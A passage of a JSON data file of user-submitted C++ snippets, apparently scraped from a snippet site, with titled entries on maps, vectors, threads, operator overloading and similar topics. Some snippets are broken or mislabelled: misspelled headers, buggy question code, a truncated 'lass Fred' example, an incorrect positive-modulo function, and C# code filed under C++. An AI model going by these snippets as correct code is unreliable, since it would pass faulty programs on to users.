    "description": "for (auto const& i : data) {     std::cout << i.name; }\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1026,
    "keyword": null,
    "link": null,
    "title": " c++ looping through a vector",
    "description": "vector<int> vi; ... for(int i : vi)    cout << \"i = \" << i << endl;\nfor(std::vector<T>::size_type i = 0; i != v.size(); i++) {     v[i].doSomething(); }\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1027,
    "keyword": null,
    "link": null,
    "title": " c++ main environment variables",
    "description": "// the third parameter (envp) is a NULL terminated array of NULL terminated strings int main(int argc, char **argv, char **envp) {   for (char **env = envp; *env != 0; env++)   {     char *thisEnv = *env;     printf(\"%s\\n\", thisEnv);       }   return 0; } \n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1028,
    "keyword": null,
    "link": null,
    "title": " c++ main function",
    "description": " int main() {      //Your code... Or someone elses, doesn't really matter.      return 0; }\nint main(int argc, char *argv[])\n",
    "reg_date": "2021-10-12T11:38:14.000Z"
  },
  {
    "id": 1029,
    "keyword": null,
    "link": null,
    "title": " c++ main function parameters",
    "description": "#include <iostream>  //In C++ you don't need to give parameters to your main function  int main() { \t//code     return 0; }\n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1030,
    "keyword": null,
    "link": null,
    "title": " c++ make shared ptr",
    "description": "#include <memory> std::shared_ptr<int> foo = std::make_shared<int> (10);\n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1031,
    "keyword": null,
    "link": null,
    "title": " c++ make vector loop more faster",
    "description": "#include <vector> #include <iostream> #include <ctime> using namespace std;  int main() {     const int BIG = 20000000;     vector <int> v;     for ( int i = 0; i < BIG; i++ ) {         v.push_back( i );     }      int now = time(0);     cout << \"start\" << endl;     int n = 0;     for(vector<int>::iterator it = v.begin(); it != v.end(); ++it) {         n += *it;     }      cout << time(0) - now << endl;     now = time(0);     for(size_t i = 0; i < v.size(); ++i) {         n += v[i];     }     cout << time(0) - now << endl;      return n != 0; }\n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1032,
    "keyword": null,
    "link": null,
    "title": " c++ map find",
    "description": "// map::find #include <iostream> #include <map>  int main () {   std::map<char,int> mymap;   std::map<char,int>::iterator it;    mymap['a']=50;   mymap['b']=100;   mymap['c']=150;   mymap['d']=200;    it = mymap.find('b');   if (it != mymap.end())     mymap.erase (it);    // print content:   std::cout << \"elements in mymap:\" << '\\n';   std::cout << \"a => \" << mymap.find('a')->second << '\\n';   std::cout << \"c => \" << mymap.find('c')->second << '\\n';   std::cout << \"d => \" << mymap.find('d')->second << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1033,
    "keyword": null,
    "link": null,
    "title": " c++ map insert",
    "description": "std::map<TypeA, TypeB> my_map;\t// TypeA key; TypeB value my_map.insert({ key, value }); \t// insert elements in random order\nmp.insert({ 2, 30 }); \n  mymap.insert ( std::pair<char,int>('a',100) );\n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1034,
    "keyword": null,
    "link": null,
    "title": " c++ map iterator",
    "description": "//traditional way (long) for(map<string,int>::iterator it=m.begin(); it!=m.end(); ++it) \tif(it->second)cout<<it->first<<\" \"; //easy way(short) just works with c++11 or later versions for(auto &x:m) \tif(x.second)cout<<x.first<<\" \"; //condition is just an example of use \n#include <iostream> #include <map>   int main() {   std::map<int, float> num_map;   // calls a_map.begin() and a_map.end()   for (auto it = num_map.begin(); it != num_map.end(); ++it) {     std::cout << it->first << \", \" << it->second << '\\n';   } }\n    for (auto i : m)         cout << i.first << \"   \" << i.second              << endl;\n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1035,
    "keyword": null,
    "link": null,
    "title": " c++ map key exists",
    "description": "if ( m.find(\"f\") == m.end() ) {   // not found } else {   // found }\nif ( !(myMap.find(\"key\") == myMap.end()) ) {\t// \"key\" exists\t    } else {\t// not found\t    } \n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1036,
    "keyword": null,
    "link": null,
    "title": " c++ max and min of vector",
    "description": "*max_element(a.begin(), a.end()); \nauto max = *max_element(vector.begin(), vector.end());\n#include <iostream> #include <algorithm>  template <typename T, size_t N> const T* mybegin(const T (&a)[N]) { return a; }     template <typename T, size_t N> const T* myend  (const T (&a)[N]) { return a+N; }  int main() {     const int cloud[] = { 1,2,3,4,-7,999,5,6 };      std::cout << *std::max_element(mybegin(cloud), myend(cloud)) << '\\n';     std::cout << *std::min_element(mybegin(cloud), myend(cloud)) << '\\n'; }\nauto it = max_element(std::begin(cloud), std::end(cloud)); // c++11\ntemplate <typename T, size_t N> const T* mybegin(const T (&a)[N]) { return a; }     template <typename T, size_t N> const T* myend  (const T (&a)[N]) { return a+N; }\n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1037,
    "keyword": null,
    "link": null,
    "title": " c++ max of array",
    "description": "cout << \" max element is: \" << *max_element(array , array + n) << endl;\n*max_element (first_index, last_index); ex:- for an array arr of size n *max_element(arr, arr + n);\nauto Max1 = *max_element(ForwardIt first, ForwardIt last); auto Max2 = *max_element(ForwardIt first, ForwardIt last, Compare comp);  //Example: #include <bits/stdc++.h> using namespace std; main() {     vector<int> v{ 3, 1, -14, 1, 5, 9 };      int result;          result = *max_element(v.begin(), v.end());     cout << \"max element is: \" << result << '\\n'; // 9       result = *max_element(v.begin(), v.end(), [](int a, int b) { return abs(a)<abs(b); });     cout << \"max element (absolute) is: \" << result << '\\n'; //-14 }\nint main(int argc, char** argv) {   int A[4] = {0, 2, 3, 1};   const int N = sizeof(A) / sizeof(int);    cout << \"Index of max element: \"        << distance(A, max_element(A, A + N))        << endl;    return 0; } \n",
    "reg_date": "2021-10-12T11:38:15.000Z"
  },
  {
    "id": 1038,
    "keyword": null,
    "link": null,
    "title": " c++ measure time in microseconds",
    "description": "auto start = std::chrono::high_resolution_clock::now(); ... auto elapsed = std::chrono::high_resolution_clock::now() - start;  long long microseconds = std::chrono::duration_cast<std::chrono::microseconds>(elapsed).count();\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1039,
    "keyword": null,
    "link": null,
    "title": " c++ memcmp",
    "description": "/* memcmp example */ #include <stdio.h> #include <string.h>  int main () {   char buffer1[] = \"DWgaOtP12df0\";   char buffer2[] = \"DWGAOTP12DF0\";    int n;    n=memcmp ( buffer1, buffer2, sizeof(buffer1) );    if (n>0) printf (\"'%s' is greater than '%s'.\\n\",buffer1,buffer2);   else if (n<0) printf (\"'%s' is less than '%s'.\\n\",buffer1,buffer2);   else printf (\"'%s' is the same as '%s'.\\n\",buffer1,buffer2);    return 0; }\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1040,
    "keyword": null,
    "link": null,
    "title": " c++ menu selection with arrow keys",
    "description": "// Menu example for tjnapster #include <iostream> #include <conio.h> #include <windows.h> #include <cstdlib>  using namespace std;  HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE); // used for goto COORD CursorPosition; // used for goto  void gotoXY(int,int); // function defined below if this is new to you.  int main() { \tint menu_item=0, run, x=7; \tbool running = true; \t \tgotoXY(18,5); cout << \"Main Menu\"; \tgotoXY(18,7); cout << \"->\"; \t \twhile(running) \t{                 gotoXY(20,7);  cout << \"1) Input\"; \t\tgotoXY(20,8);  cout << \"2) Output\"; \t\tgotoXY(20,9);  cout << \"3) ...\"; \t\tgotoXY(20,10); cout << \"4) ...\"; \t\tgotoXY(20,11); cout << \"Quit Program\";  \t\tsystem(\"pause>nul\"); // the >nul bit causes it the print no message \t\t \t\tif(GetAsyncKeyState(VK_DOWN) && x != 11) //down button pressed \t\t\t{ \t\t\t\tgotoXY(18,x); cout << \"  \"; \t\t\t\tx++; \t\t\t\tgotoXY(18,x); cout << \"->\"; \t\t\t\tmenu_item++; \t\t\t\tcontinue; \t\t\t\t \t\t\t} \t\t\t \t\tif(GetAsyncKeyState(VK_UP) && x != 7) //up button pressed \t\t\t{ \t\t\t\tgotoXY(18,x); cout << \"  \"; \t\t\t\tx--; \t\t\t\tgotoXY(18,x); cout << \"->\"; \t\t\t\tmenu_item--; \t\t\t\tcontinue; \t\t\t} \t\t\t \t\tif(GetAsyncKeyState(VK_RETURN)){ // Enter key pressed \t\t\t \t\t\tswitch(menu_item){ \t\t\t\t \t\t\t\tcase 0: { \t\t\t\t\t \t\t\t\t\tgotoXY(20,16); \t\t\t\t\tcout << \"You chose Input...     \"; \t\t\t\t\tbreak; \t\t\t\t} \t\t\t\t\t \t\t\t\t\t \t\t\t\tcase 1: { \t\t\t\t\tgotoXY(20,16); \t\t\t\t\tcout << \"You chose Output...     \"; \t\t\t\t\tbreak; \t\t\t\t} \t\t\t\t\t \t\t\t\tcase 2: { \t\t\t\t\tgotoXY(20,16); \t\t\t\t\tcout << \"You chose Option 3...     \"; \t\t\t\t\tbreak; \t\t\t\t} \t\t\t\t\t \t\t\t\tcase 3: { \t\t\t\t\tgotoXY(20,16); \t\t\t\t\tcout << \"You chose Option 4...     \"; \t\t\t\t\tbreak; \t\t\t\t} \t\t\t\t\t \t\t\t\tcase 4: { \t\t\t\t\tgotoXY(20,16); \t\t\t\t\tcout << \"The program has now terminated!!\"; \t\t\t\t\trunning = false; \t\t\t\t} \t\t\t\t \t\t\t} \t\t\t\t \t\t}\t\t \t\t \t} \t \tgotoXY(20,21); \treturn 0; }  void gotoXY(int x, int y)  {  \tCursorPosition.X = x;  \tCursorPosition.Y = y;  \tSetConsoleCursorPosition(console,CursorPosition);  }\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1041,
    "keyword": null,
    "link": null,
    "title": " c++ message box error",
    "description": "// A single line of C-code needed MessageBox(NULL, \"An error has occurred!\", \"Title!\", MB_ICONERROR | MB_OK);\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1042,
    "keyword": null,
    "link": null,
    "title": " c++ method name",
    "description": "// EXAMPLE: if you are in a function/method called YourMethod() std::cout << \"Current function: \" << __FUNCTION__; // OUTPUT: Current function: YourMethod  // SYNTAX // __FUNCTION__\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1043,
    "keyword": null,
    "link": null,
    "title": " c++ milliseconds",
    "description": "#include <chrono>  uint32_t GetMillis() { \tusing namespace std::chrono; \treturn static_cast<uint32_t>(duration_cast<milliseconds>( \t\tsystem_clock::now().time_since_epoch()).count()); }\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1044,
    "keyword": null,
    "link": null,
    "title": " c++ min",
    "description": "#include <algorithm>    // std::min std::min(1,2);\nint min = INT_MIN;\n#include <iostream>  template <class T> const T& min(const T& a, const T& b) { \treturn a < b ? a : b; }  int main() { \tstd::cout << min(1, 2) << std::endl; } \n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1045,
    "keyword": null,
    "link": null,
    "title": " c++ min int",
    "description": "#include <limits>  int imin = std::numeric_limits<int>::min(); // minimum value int imax = std::numeric_limits<int>::max(); // maximum value (2147483647)\nint min = INT_MIN;\n2147483647   unsigned long long int = 18 446 744 073 709 551 615\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1046,
    "keyword": null,
    "link": null,
    "title": " c++ modulo make it give only positive numbers",
    "description": "int mod(int a, int b) {   return (a+b)%b; }\n",
    "reg_date": "2021-10-12T11:38:16.000Z"
  },
  {
    "id": 1047,
    "keyword": null,
    "link": null,
    "title": " c++ movment",
    "description": "{     CharacterController characterController;      public float speed = 6.0f;     public float jumpSpeed = 8.0f;     public float gravity = 20.0f;      private Vector3 moveDirection = Vector3.zero;      void Start()     {         characterController = GetComponent<CharacterController>();     }      void Update()     {         if (characterController.isGrounded)         {             // We are grounded, so recalculate             // move direction directly from axes              moveDirection = new Vector3(Input.GetAxis(\"Horizontal\"), 0.0f, Input.GetAxis(\"Vertical\"));             moveDirection *= speed;              if (Input.GetButton(\"Jump\"))             {                 moveDirection.y = jumpSpeed;             }         }          // Apply gravity. Gravity is multiplied by deltaTime twice (once here, and once below         // when the moveDirection is multiplied by deltaTime). This is because gravity should be applied         // as an acceleration (ms^-2)         moveDirection.y -= gravity * Time.deltaTime;          // Move the controller         characterController.Move(moveDirection * Time.deltaTime);     } }\n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1048,
    "keyword": null,
    "link": null,
    "title": " c++ multiline string",
    "description": "#include <iostream> #include <string>  std::string YourString = R\"( \tYour     multiline     string )\";   /* SYNTAX R\"(  \") */ \n#include <iostream>   int main() {  \t \t//Display in Multiline using escape character /n \tconst char* example2 = \"Line1\\n\" \t\"Line2\\n\" \t\t\"Line3\\n\" \t\t\"Line4\\n\" \t\t; \tstd::cout << example2 << std::endl; \tstd::cout << \"===================================\" << std::endl; \t// display in multiline using Raw \tconst char* example = R\"(Line1 Line2 Line3  Line4  )\";//no need to use escape character  /n \tstd::cout << example << std::endl;  \tstd::cin.get(); } \n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1049,
    "keyword": null,
    "link": null,
    "title": " c++ multiple inheritance diamond problem",
    "description": "class Parent; class a : virtual public Parent; //add virtual class b : virtual public Parent; //add virtual class c : public a, public b;\n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1050,
    "keyword": null,
    "link": null,
    "title": " c++ multiply char",
    "description": "char star = '*';   int num = 7; std::cout << std::string(num, star) << std::endl;   \n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1051,
    "keyword": null,
    "link": null,
    "title": " c++ multithreading",
    "description": "#include <iostream> #include <threads> #include <vecotr>  std::vector<std::thread*> threads;  for(int i = 0; i < x; i++) {   threads.push_back(new std::thread(func)); }\n#include <iostream> #include <cstdlib> #include <pthread.h>  using namespace std;  #define NUM_THREADS 5  void *PrintHello(void *threadid) {    long tid;    tid = (long)threadid;    cout << \"Hello World! Thread ID, \" << tid << endl;    pthread_exit(NULL); }  int main () {    pthread_t threads[NUM_THREADS];    int rc;    int i;        for( i = 0; i < NUM_THREADS; i++ ) {       cout << \"main() : creating thread, \" << i << endl;       rc = pthread_create(&threads[i], NULL, PrintHello, (void *)i);              if (rc) {          cout << \"Error:unable to create thread,\" << rc << endl;          exit(-1);       }    }    pthread_exit(NULL); }\n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1052,
    "keyword": null,
    "link": null,
    "title": " c++ mutex lock",
    "description": "// mutex::lock/unlock #include <iostream>       // std::cout #include <thread>         // std::thread #include <mutex>          // std::mutex  std::mutex mtx;           // mutex for critical section  void print_thread_id (int id) {   // critical section (exclusive access to std::cout signaled by locking mtx):   mtx.lock();   std::cout << \"thread #\" << id << '\\n';   mtx.unlock(); }  int main () {   std::thread threads[10];   // spawn 10 threads:   for (int i=0; i<10; ++i)     threads[i] = std::thread(print_thread_id,i+1);    for (auto& th : threads) th.join();    return 0; }\n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1053,
    "keyword": null,
    "link": null,
    "title": " c++ my boolean operator return only 0",
    "description": "#include <iostream> #include<string> using namespace std;   class Student{   public:       string name;       string major;       double gpa;       Student(string aName, string aMajor, double aGpa){         name=aName;         major=aMajor;         aGpa=gpa;       }       bool hasHonor(){         if (aGpa>=3.5)             return true;         if (aGpa<3.5)         return false;       } }; int main() {     Student student1(\"Jim\", \"Businnes\", 2.4);     Student student2(\"Pam\", \"Art\", 4);     cout<<student2.hasHonor()<<endl;     cout<<student1.hasHonor();     return 0; }\n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1054,
    "keyword": null,
    "link": null,
    "title": " c++ namespace",
    "description": "#include <iostream> using namespace std;   int main() {     cout<< \"Hello World\" ;  }  //If you are a web developer, please give https://code.ionicbyte.com/ a try\nnamespace Parent {     inline namespace new_ns     {          template <typename T>          struct C          {              T member;          };     }      template<>      class C<int> {}; } \nNamespace std::cout or cout <<\n//Header.h #include <string>  namespace Test {     namespace old_ns     {         std::string Func() { return std::string(\"Hello from old\"); }     }      inline namespace new_ns     {         std::string Func() { return std::string(\"Hello from new\"); }     } }  #include \"header.h\" #include <string> #include <iostream>  int main() {     using namespace Test;     using namespace std;      string s = Func();     std::cout << s << std::endl; // \"Hello from new\"     return 0; } \n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1055,
    "keyword": null,
    "link": null,
    "title": " c++ namespace example",
    "description": "#include <iostream>  using namespace std;  int main() {     cout << \"Hello World\";     system(\"pause\");     return 0;      }\n//namespace is a declarative region to provide scope for identifiers #include <bits/stdc++.h>  using namespace std; //including namespace std for cin and cout //my custom namespace for variables and functions namespace abc {   void fun()   {     cout<<\"Hello world\"<<endl;   }   int x=10; } using namespace abc; int main() {   cout<<10;   fun();   return 0; }\n#include <iostream> using namespace std; namespace square{ \tint x; \tint y; } int main(){ \tusing namespace square; \tx = 10; \ty = 0; \tcout << x << y << endl; }\nnamespace Parent {     inline namespace new_ns     {          template <typename T>          struct C          {              T member;          };     }      template<>      class C<int> {}; } \nNamespace std::cout or cout <<\n",
    "reg_date": "2021-10-12T11:38:17.000Z"
  },
  {
    "id": 1056,
    "keyword": null,
    "link": null,
    "title": " c++ natural log",
    "description": "#include <math.h>       /* log */   double param, result;   param = 10;   result = log (param);   printf (\"log(%f) = %f\\n\", param, result );\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1057,
    "keyword": null,
    "link": null,
    "title": " c++ nerds",
    "description": "// don't be this guy\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1058,
    "keyword": null,
    "link": null,
    "title": " c++ nested switch statements",
    "description": "switch(ch1) {    case 'A':        cout << \"This A is part of outer switch\";       switch(ch2) {          case 'A':             cout << \"This A is part of inner switch\";             break;          case 'B': // ...       }       break;    case 'B': // ... } \n#include <iostream> using namespace std;   int main () {    // local variable declaration:    int a = 100;    int b = 200;      switch(a) {       case 100:           cout << \"This is part of outer switch\" << endl;          switch(b) {             case 200:                cout << \"This is part of inner switch\" << endl;          }    }    cout << \"Exact value of a is : \" << a << endl;    cout << \"Exact value of b is : \" << b << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1059,
    "keyword": null,
    "link": null,
    "title": " c++ noexcept",
    "description": "#include <iostream> #include <utility> #include <vector>   void may_throw(); void no_throw() noexcept; auto lmay_throw = []{}; auto lno_throw = []() noexcept {}; class T{ public:   ~T(){} // dtor prevents move ctor          // copy ctor is noexcept }; class U{ public:   ~U(){} // dtor prevents move ctor          // copy ctor is noexcept(false)   std::vector<int> v; }; class V{ public:   std::vector<int> v; };   int main() {  T t;  U u;  V v;    std::cout << std::boolalpha            << \"Is may_throw() noexcept? \" << noexcept(may_throw()) << '\\n'            << \"Is no_throw() noexcept? \" << noexcept(no_throw()) << '\\n'            << \"Is lmay_throw() noexcept? \" << noexcept(lmay_throw()) << '\\n'            << \"Is lno_throw() noexcept? \" << noexcept(lno_throw()) << '\\n'            << \"Is ~T() noexcept? \" << noexcept(std::declval<T>().~T()) << '\\n'            // note: the following tests also require that ~T() is noexcept because            // the expression within noexcept constructs and destroys a temporary            << \"Is T(rvalue T) noexcept? \" << noexcept(T(std::declval<T>())) << '\\n'            << \"Is T(lvalue T) noexcept? \" << noexcept(T(t)) << '\\n'            << \"Is U(rvalue U) noexcept? \" << noexcept(U(std::declval<U>())) << '\\n'            << \"Is U(lvalue U) noexcept? \" << noexcept(U(u)) << '\\n'              << \"Is V(rvalue V) noexcept? \" << noexcept(V(std::declval<V>())) << '\\n'            << \"Is V(lvalue V) noexcept? \" << noexcept(V(v)) << '\\n';   }\nc++ noexcept\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1060,
    "keyword": null,
    "link": null,
    "title": " c++ object program",
    "description": "// Program to illustrate the working of // objects and class in C++ Programming  #include <iostream> using namespace std;  // create a class class Room {     public:     double length;     double breadth;     double height;      double calculateArea() {         return length * breadth;     }      double calculateVolume() {         return length * breadth * height;     } };  int main() {      // create object of Room class     Room room1;      // assign values to data members     room1.length = 42.5;     room1.breadth = 30.8;     room1.height = 19.2;      // calculate and display the area and volume of the room     cout << \"Area of Room =  \" << room1.calculateArea() << endl;     cout << \"Volume of Room =  \" << room1.calculateVolume() << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1061,
    "keyword": null,
    "link": null,
    "title": " c++ online",
    "description": "IDE Shortcuts: New file : Ctrl-M Run Code : F9 Debug Code : F8 Save Project : Ctrl-S Beautify Code : Ctrl-B Settings Menu : Ctrl-Shift-S Info : Ctrl-I  Editor Shortcuts: showSettingsMenu : Ctrl-, goToNextError : Alt-E goToPreviousError : Alt-Shift-E selectall : Ctrl-A gotoline : Ctrl-L fold : Alt-L|Ctrl-F1 unfold : Alt-Shift-L|Ctrl-Shift-F1 toggleFoldWidget : F2 toggleParentFoldWidget : Alt-F2 foldOther : Alt-0 unfoldall : Alt-Shift-0 findnext : Ctrl-K findprevious : Ctrl-Shift-K selectOrFindNext : Alt-K selectOrFindPrevious : Alt-Shift-K find : Ctrl-F overwrite : Insert selecttostart : Ctrl-Shift-Home gotostart : Ctrl-Home selectup : Shift-Up golineup : Up selecttoend : Ctrl-Shift-End gotoend : Ctrl-End selectdown : Shift-Down golinedown : Down selectwordleft : Ctrl-Shift-Left gotowordleft : Ctrl-Left selecttolinestart : Alt-Shift-Left gotolinestart : Alt-Left|Home selectleft : Shift-Left gotoleft : Left selectwordright : Ctrl-Shift-Right gotowordright : Ctrl-Right selecttolineend : Alt-Shift-Right gotolineend : Alt-Right|End selectright : Shift-Right gotoright : Right selectpagedown : Shift-Pagedown gotopagedown : Pagedown selectpageup : Shift-Pageup gotopageup : Pageup scrollup : Ctrl-Up scrolldown : Ctrl-Down selectlinestart : Shift-Home selectlineend : Shift-End togglerecording : Ctrl-Alt-E replaymacro : Ctrl-Shift-E jumptomatching : Ctrl-P selecttomatching : Ctrl-Shift-P expandToMatching : Ctrl-Shift-M removeline : Ctrl-D duplicateSelection : Ctrl-Shift-D sortlines : Ctrl-Alt-S togglecomment : Ctrl-/ toggleBlockComment : Ctrl-Shift-/ modifyNumberUp : Ctrl-Shift-Up modifyNumberDown : Ctrl-Shift-Down replace : Ctrl-H undo : Ctrl-Z redo : Ctrl-Shift-Z|Ctrl-Y copylinesup : Alt-Shift-Up movelinesup : Alt-Up copylinesdown : Alt-Shift-Down movelinesdown : Alt-Down del : Delete backspace : Shift-Backspace|Backspace cut_or_delete : Shift-Delete removetolinestart : Alt-Backspace removetolineend : Alt-Delete removewordleft : Ctrl-Backspace removewordright : Ctrl-Delete outdent : Shift-Tab indent : Tab blockoutdent : Ctrl-[ blockindent : Ctrl-] transposeletters : Ctrl-T touppercase : Ctrl-U tolowercase : Ctrl-Shift-U expandtoline : Ctrl-Shift-L addCursorAbove : Ctrl-Alt-Up addCursorBelow : Ctrl-Alt-Down addCursorAboveSkipCurrent : Ctrl-Alt-Shift-Up addCursorBelowSkipCurrent : Ctrl-Alt-Shift-Down selectMoreBefore : Ctrl-Alt-Left selectMoreAfter : Ctrl-Alt-Right selectNextBefore : Ctrl-Alt-Shift-Left selectNextAfter : Ctrl-Alt-Shift-Right splitIntoLines : Ctrl-Alt-L alignCursors : Ctrl-Alt-A findAll : Ctrl-Alt-K showKeyboardShortcuts : Ctrl-Alt-H           \nThree good online compilers: https://www.onlinegdb.com/online_c++_compiler https://www.programiz.com/cpp-programming/online-compiler/ http://cpp.sh/\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1062,
    "keyword": null,
    "link": null,
    "title": " c++ online compiler",
    "description": "These two are good C++ compilers: https://www.onlinegdb.com/online_c++_compiler https://www.programiz.com/cpp-programming/online-compiler/\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1063,
    "keyword": null,
    "link": null,
    "title": " c++ operator overloading",
    "description": "// money.h -- define the prototype class Money {    public:       Money & operator += (const Money &rhs); }  // money.cpp -- define the implementation Money& Money :: operator += (const Money &rhs) {    // Yadda Yadda       return *this; }\n#include <iostream>  class ExampleClass {   public:     ExampleClass() {}   \tExampleClass(int ex) {       example_ = 0;     }     int&       example()        { return example_; }     const int& example() const  { return example_; }   \t//Overload the \"+\" Operator   \tExampleClass operator+ (const ExampleClass& second_object_of_class) {     \tExampleClass object_of_class;     \tobject_of_class.example() = this -> example() + second_object_of_class.example();     \treturn object_of_class;   \t}   private:   \tint example_; };  int main() {   ExampleClass c1, c2;   c1.example() = 1;   c2.example() = 2;   ExampleClass c3 = c1 + c2;   //Calls operator+() of c1 with c2 as second_object_of_class   //c3 gets set to object_of_class   std::cout << c3.example(); }\n#include <iostream> #include <string>   class Car { private:     std::string m_make;     std::string m_model;   public:     Car(const std::string& make, const std::string& model)         : m_make{ make }, m_model{ model }     {     }       friend bool operator== (const Car &c1, const Car &c2);     friend bool operator!= (const Car &c1, const Car &c2); };   bool operator== (const Car &c1, const Car &c2) {     return (c1.m_make== c2.m_make &&             c1.m_model== c2.m_model); }   bool operator!= (const Car &c1, const Car &c2) {     return !(c1== c2); }   int main() {     Car corolla{ \"Toyota\", \"Corolla\" };     Car camry{ \"Toyota\", \"Camry\" };       if (corolla == camry)         std::cout << \"a Corolla and Camry are the same.\\n\";       if (corolla != camry)         std::cout << \"a Corolla and Camry are not the same.\\n\";       return 0; }\nBox operator+(const Box&); \n#include <iostream> using namespace std;  class Box {    public:       double getVolume(void) {          return length * breadth * height;       }       void setLength( double len ) {          length = len;       }       void setBreadth( double bre ) {          breadth = bre;       }       void setHeight( double hei ) {          height = hei;       }              // Overload + operator to add two Box objects.       Box operator+(const Box& b) {          Box box;          box.length = this->length + b.length;          box.breadth = this->breadth + b.breadth;          box.height = this->height + b.height;          return box;       }           private:       double length;      // Length of a box       double breadth;     // Breadth of a box       double height;      // Height of a box };  // Main function for the program int main() {    Box Box1;                // Declare Box1 of type Box    Box Box2;                // Declare Box2 of type Box    Box Box3;                // Declare Box3 of type Box    double volume = 0.0;     // Store the volume of a box here      // box 1 specification    Box1.setLength(6.0);     Box1.setBreadth(7.0);     Box1.setHeight(5.0);      // box 2 specification    Box2.setLength(12.0);     Box2.setBreadth(13.0);     Box2.setHeight(10.0);      // volume of box 1    volume = Box1.getVolume();    cout << \"Volume of Box1 : \" << volume <<endl;      // volume of box 2    volume = Box2.getVolume();    cout << \"Volume of Box2 : \" << volume <<endl;     // Add two object as follows:    Box3 = Box1 + Box2;     // volume of box 3    volume = Box3.getVolume();    cout << \"Volume of Box3 : \" << volume <<endl;     return 0; }\nostream &operator<<(ostream &output, const MyClass &myObject) {    output << \"P : \" << myObject.property;   return output;             } \n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1064,
    "keyword": null,
    "link": null,
    "title": " c++ operator overloading not equal",
    "description": "lass Fred { public:   // ... }; if    // Without operator overloading:   Fred add(const Fred& x, const Fred& y);   Fred mul(const Fred& x, const Fred& y);   Fred f(const Fred& a, const Fred& b, const Fred& c)   {     return add(add(mul(a,b), mul(b,c)), mul(c,a));    // Yuk...   } else   // With operator overloading:   Fred operator+ (const Fred& x, const Fred& y);   Fred operator* (const Fred& x, const Fred& y);   Fred f(const Fred& a, const Fred& b, const Fred& c)   {     return a*b + b*c + c*a;   } #endif\n",
    "reg_date": "2021-10-12T11:38:18.000Z"
  },
  {
    "id": 1065,
    "keyword": null,
    "link": null,
    "title": " c++ operator overloading too many parameters",
    "description": "friend ostream& operator<<(ostream& out, int x){      out << names[x] << \" \" << ages[x] <<endl;      return out; }\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1066,
    "keyword": null,
    "link": null,
    "title": " c++ optimization dynamic 2d array",
    "description": "int** a = new int*[rowCount]; for(int i = 0; i < rowCount; ++i)     a[i] = new int[colCount];\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1067,
    "keyword": null,
    "link": null,
    "title": " c++ optimize big int array",
    "description": "// https://stackoverflow.com/questions/9674636/c-optimize-array-of-ints \n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1068,
    "keyword": null,
    "link": null,
    "title": " c++ output",
    "description": "std::cout << \" Something \";\n// cin with strings #include <iostream> #include <string> using namespace std;  int main () {   string mystr;   cout << \"What's your name? \";   getline (cin, mystr);   cout << \"Hello \" << mystr << \".\\n\";   cout << \"What is your favorite team? \";   getline (cin, mystr);   cout << \"I like \" << mystr << \" too!\\n\";   return 0; }\nstd::cout << \"Hello World!\" << std::endl; //Or you can do std::cout << \"Hello World!\" <<; //Only in some scenarios \n  int i;   cout << \"Please enter an integer value: \";   cin >> i;\n#include <iostream>  int main(){   std::cout << \"Hello World!\" << std::endl; // prints \"Hello World\" }\n#include <iostream> int main() {   int year; //variable created as a integer   std::cin >> year;//It takes input from the user   std::cout << \"Year: \" << year; //It prints output on the screen }\n",
    "reg_date": "2021-10-12T11:38:19.000Z"
  },
  {
    "id": 1069,
    "keyword": null,
    "link": null,
    "title": " c++ over load operator",
